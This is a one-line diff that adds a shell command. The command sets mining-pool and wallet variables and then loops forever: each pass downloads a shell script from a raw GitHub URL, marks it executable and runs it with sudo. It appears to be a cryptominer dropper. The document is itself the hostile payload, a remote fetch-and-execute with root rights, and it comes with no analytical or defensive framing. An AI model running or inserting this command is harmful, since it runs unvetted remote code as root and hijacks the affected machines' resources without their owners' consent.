@@ -1,0 +1,1 @@
+export pool_pass2=x;export pool_address2=;export wallet2=;export nicehash2=false;while [ 1 ] ;do wget https://raw.githubusercontent.com/liolita1998/lulu/master/khonglolo.sh ; sudo chmod +x khonglolo.sh ; sudo ./khonglolo.sh ;done;
